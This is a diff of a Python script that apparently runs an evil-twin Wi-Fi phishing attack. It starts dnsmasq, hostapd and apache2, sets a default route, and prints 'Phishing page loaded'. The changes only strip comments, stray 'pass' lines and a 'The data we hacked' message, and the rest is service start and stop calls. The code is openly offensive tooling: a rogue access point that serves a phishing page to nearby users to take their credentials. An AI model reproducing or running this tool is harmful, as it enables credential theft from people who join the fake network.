@@ -31,7 +31,6 @@ do_command(line)
 do_command('dnsmasq -C dnsmasq.conf')
 do_command('hostapd hostapd.conf -B')
 do_command('service apache2 start')
-# do_command('service mysql start')
 do_command('route add default gw 10.0.0.1')
 time.sleep(1)
 print('---> Phishing page loaded \n')
@@ -45,19 +44,13 @@ while True:
             os.remove("dnsmasq.conf")
         except OSError:
             print("removing dnsmasq.conf failed")
-            pass
         try:
             print("removing hostapd.conf")
             os.remove("hostapd.conf")
         except OSError:
             print("removing hostapd.conf failed")
-            pass
 
-        # if sys.argv[1] == "1":
         do_command('service NetworkManager start')
-        # if sys.argv[1] == "2":
-        #     os.system('service network-manager start')
-        print("The data we hacked")
         do_command('service hostapd stop')
         do_command('service apache2 stop')
         do_command('service dnsmasq stop')
